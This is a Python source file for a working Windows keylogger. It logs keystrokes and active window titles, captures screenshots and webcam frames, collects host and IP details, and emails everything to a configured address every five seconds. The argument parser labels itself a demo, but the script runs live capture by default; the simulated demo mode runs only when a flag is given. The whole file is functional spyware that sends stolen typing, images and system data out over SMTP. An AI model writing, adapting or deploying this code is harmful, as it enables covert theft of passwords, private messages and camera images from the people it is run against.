import keyboard
import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import platform
import socket
from requests import get
import logging
from PIL import ImageGrab, Image
import os
import psutil
import win32gui
from datetime import datetime
from dotenv import load_dotenv
import cv2 




load_dotenv()

active_apps = {}

def get_active_app_name():
    active_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    return active_app

def screenshot():
    im = ImageGrab.grab()
    im.save("screenshot.png")

def ensure_file_access(path):
    """
    Ensure file exists and is readable. If not present, create an empty file.
    Returns True if file exists and is readable, False otherwise.
    """
    try:
        if not os.path.exists(path):
            open(path, "w").close()
        with open(path, "rb"):
            pass
        return True
    except Exception as e:
        print(f"Warning: cannot access {path}: {e}")
        return False



def capture_camera(filename="webcam.png", timeout_secs=5):
    """
    Capture a single frame from the default webcam and save to filename.
    Returns True on success, False otherwise.
    """
    try:
        cap = cv2.VideoCapture(0)
        start = time.time()
        while time.time() - start < timeout_secs and not cap.isOpened():
            time.sleep(0.1)
        if not cap.isOpened():
            print("Warning: webcam not accessible.")
            return False
        ret, frame = cap.read()
        if not ret or frame is None:
            print("Warning: failed to read frame from webcam.")
            cap.release()
            return False
        cv2.imwrite(filename, frame)
        cap.release()
        return True
    except Exception as e:
        print(f"Warning: webcam capture failed: {e}")
        try:
            cap.release()
        except Exception:
            pass
        return False

def capture_keys():
    keys = []
    start_time = time.time()
    
    def on_key_press(event):
        nonlocal keys
        if event.name == 'space':
            keys.append(' ')
        else:
            keys.append(event.name)
        active_app = get_active_app_name()
        if active_app:
            active_apps[event.time] = active_app

    def write_to_file():
        nonlocal keys
        with open('document.txt', 'a') as file:
            file.write(''.join(keys))
            keys.clear()

    def write_application_log():
        with open('applicationLog.txt', 'a') as file:
            for timestamp, app_name in active_apps.items():
                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                file.write(f"Timestamp: {current_time}, Application: {app_name}\n")
            active_apps.clear()


    def send_email():
        sender_email = os.getenv('EMAIL_SENDER')
        receiver_email = os.getenv('EMAIL_RECEIVER')
        smtp_server = os.getenv('SMTP_SERVER')
        smtp_port_str = os.getenv('SMTP_PORT')
        username = os.getenv('EMAIL_USERNAME')
        password = os.getenv('EMAIL_PASSWORD')

        missing = [name for name, val in (
            ('EMAIL_SENDER', sender_email),
            ('EMAIL_RECEIVER', receiver_email),
            ('SMTP_SERVER', smtp_server),
            ('SMTP_PORT', smtp_port_str),
            ('EMAIL_USERNAME', username),
            ('EMAIL_PASSWORD', password),
        ) if not val]
        if missing:
            print(f"Missing environment variables: {', '.join(missing)}. Aborting email send.")
            return

        try:
            smtp_port = int(smtp_port_str)
        except ValueError:
            print(f"Invalid SMTP_PORT value: {smtp_port_str}")
            return
        
        message = MIMEMultipart()
        message['From'] = sender_email
        message['To'] = receiver_email
        message['Subject'] = 'Captured Data'
        
        screenshot()
        capture_camera("webcam.png")
        
        if ensure_file_access('document.txt'):
            try:
                with open('document.txt', 'rb') as file:
                    attachment = MIMEBase('application', 'octet-stream')
                    attachment.set_payload(file.read())
                encoders.encode_base64(attachment)
                attachment.add_header('Content-Disposition', 'attachment', filename='document.txt')
                message.attach(attachment)
            except Exception as e:
                print(f"Warning: could not attach document.txt: {e}")
        
        if ensure_file_access('syseminfo.txt'):
            try:
                with open('syseminfo.txt', 'rb') as file:
                    attachment = MIMEBase('application', 'octet-stream')
                    attachment.set_payload(file.read())
                encoders.encode_base64(attachment)
                attachment.add_header('Content-Disposition', 'attachment', filename='syseminfo.txt')
                message.attach(attachment)
            except Exception as e:
                print(f"Warning: could not attach syseminfo.txt: {e}")
        
        if ensure_file_access('applicationLog.txt'):
            try:
                with open('applicationLog.txt', 'rb') as file:
                    attachment = MIMEBase('application', 'octet-stream')
                    attachment.set_payload(file.read())
                encoders.encode_base64(attachment)
                attachment.add_header('Content-Disposition', 'attachment', filename='applicationLog.txt')
                message.attach(attachment)
            except Exception as e:
                print(f"Warning: could not attach applicationLog.txt: {e}")
        
        screenshot_file = 'screenshot.png'
        if os.path.exists(screenshot_file):
            with open(screenshot_file, 'rb') as file:
                attachment = MIMEBase('application', 'octet-stream')
                attachment.set_payload(file.read())
            encoders.encode_base64(attachment)
            attachment.add_header('Content-Disposition', 'attachment', filename='screenshot.png')
            message.attach(attachment)
        
        webcam_file = 'webcam.png'
        if os.path.exists(webcam_file):
            try:
                with open(webcam_file, 'rb') as file:
                    attachment = MIMEBase('application', 'octet-stream')
                    attachment.set_payload(file.read())
                encoders.encode_base64(attachment)
                attachment.add_header('Content-Disposition', 'attachment', filename='webcam.png')
                message.attach(attachment)
            except Exception as e:
                print(f"Warning: could not attach webcam.png: {e}")
        
        try:
            if smtp_port == 465:
                with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
                    server.login(username, password)
                    server.sendmail(sender_email, receiver_email, message.as_string())
            else:
                with smtplib.SMTP(smtp_server, smtp_port) as server:
                    server.ehlo()
                    server.starttls()
                    server.ehlo()
                    server.login(username, password)
                    server.sendmail(sender_email, receiver_email, message.as_string())
            print('Email sent successfully!')
        except smtplib.SMTPAuthenticationError as e:
            print('Failed to send email: authentication failed.')
            print('If using Gmail, enable 2-Step Verification and use an App Password in .env')
            print('SMTP server response:', getattr(e, 'smtp_error', str(e)))
        except smtplib.SMTPException as e:
            print('Failed to send email:', str(e))
    
    keyboard.on_press(on_key_press)
    
    try:
        while True:
            elapsed_time = time.time() - start_time
            if elapsed_time >= 5:
                write_to_file()
                write_application_log()
                send_email()
                start_time = time.time()
    except KeyboardInterrupt:
        pass
    keyboard.unhook_all()



def computer_information():
    system_information = "syseminfo.txt"
    with open(system_information, "w") as f:
        f.write("")
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write("Couldn't get Public IP Address (network disabled or blocked)")
        f.write('\n' + "Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


def _write_demo_syseminfo(path="syseminfo.txt"):
    with open(path, "w") as f:
        f.write("Public IP Address: 0.0.0.0\n")
        f.write('Processor: DemoProcessor\n')
        f.write('System: DemoOS 0.0 (Demo)\n')
        f.write('Machine: x86_64\n')
        f.write('Hostname: demo-host\n')
        f.write('Private IP Address: 127.0.0.1\n')


def _create_demo_image(path, text="DEMO"):
    img = Image.new('RGB', (640, 360), color=(73, 109, 137))
    try:
        from PIL import ImageDraw, ImageFont
        draw = ImageDraw.Draw(img)
        try:
            font = ImageFont.load_default()
            draw.text((10, 10), text, font=font, fill=(255, 255, 255))
        except Exception:
            draw.text((10, 10), text, fill=(255, 255, 255))
    except Exception:
        pass
    img.save(path)


def demo_mode(iterations=2, interval=2):
    """Generate safe, simulated outputs for presentations.
    This does NOT capture real keyboard, webcam, screenshots, or send email.
    """
    print("Running in DEMO mode — no live capture, no network sends")
    for i in range(iterations):
        # simulated keystrokes
        with open('document.txt', 'a') as f:
            f.write(f"[DEMO] sample keystrokes iteration {i+1}\n")

        # simulated application log
        with open('applicationLog.txt', 'a') as f:
            f.write(f"Timestamp: DEMO_{i+1}, Application: DemoApp\n")

        # create/update demo system info
        _write_demo_syseminfo()

        # create demo screenshot and webcam image
        _create_demo_image('screenshot.png', text=f'Demo Screenshot {i+1}')
        _create_demo_image('webcam.png', text=f'Demo Webcam {i+1}')

        print(f"Demo iteration {i+1} complete — files updated")
        time.sleep(interval)


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(description='Keylogger demo/safe-run options')
    parser.add_argument('--demo', action='store_true', help='Run in demo mode (no live capture, no network)')
    parser.add_argument('--demo-iterations', type=int, default=2, help='Number of demo iterations')
    parser.add_argument('--demo-interval', type=int, default=2, help='Seconds between demo iterations')
    args = parser.parse_args()

    if args.demo:
        demo_mode(iterations=args.demo_iterations, interval=args.demo_interval)
    else:
        # normal (live) behavior — gather system info then start capture loop
        computer_information()
        capture_keys()